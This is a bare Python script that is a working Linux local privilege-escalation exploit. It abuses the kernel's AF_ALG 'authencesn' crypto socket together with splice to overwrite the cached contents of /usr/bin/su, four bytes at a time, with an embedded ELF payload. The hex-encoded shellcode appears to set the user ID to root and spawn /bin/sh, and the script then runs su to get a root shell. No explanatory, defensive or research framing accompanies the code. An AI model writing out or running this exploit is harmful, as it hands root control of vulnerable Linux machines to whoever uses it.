#!/usr/bin/env python3
import os
import socket


def hex_decode(hex_str):
    return bytes.fromhex(hex_str)


def patch_chunk(fd, offset, chunk):
    # AF_ALG = 38, SOCK_SEQPACKET = 5
    sock = socket.socket(38, 5, 0)
    sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

    SOL_ALG = 279

    sock.setsockopt(SOL_ALG, 1, hex_decode('0800010000000010' + '0' * 64))
    sock.setsockopt(SOL_ALG, 5, None, 4)

    conn, _ = sock.accept()

    write_size = offset + 4
    zero = hex_decode('00')

    conn.sendmsg(
        [b"A" * 4 + chunk],
        [
            (SOL_ALG, 3, zero * 4),
            (SOL_ALG, 2, b'\x10' + zero * 19),
            (SOL_ALG, 4, b'\x08' + zero * 3),
        ],
        32768,
    )

    read_fd, write_fd = os.pipe()
    os.splice(fd, write_fd, write_size, offset_src=0)
    os.splice(read_fd, conn.fileno(), write_size)

    try:
        conn.recv(8 + offset)
    except Exception:
        pass


target_fd = os.open("/usr/bin/su", 0)

payload = hex_decode(
    "7f454c4602010100000000000000000002003e00010000007800400000000000"
    "400000000000000000000000000000000000000040003800010000000000000001000000"
    "050000000000000000000000000040000000000000004000000000009e00000000000000"
    "9e00000000000000001000000000000031c031ffb0690f05488d3d0f00000031f66a3b58"
    "990f0531ff6a3c580f052f62696e2f7368000000"
)

offset = 0
while offset < len(payload):
    patch_chunk(target_fd, offset, payload[offset:offset + 4])
    offset += 4

os.system("su")
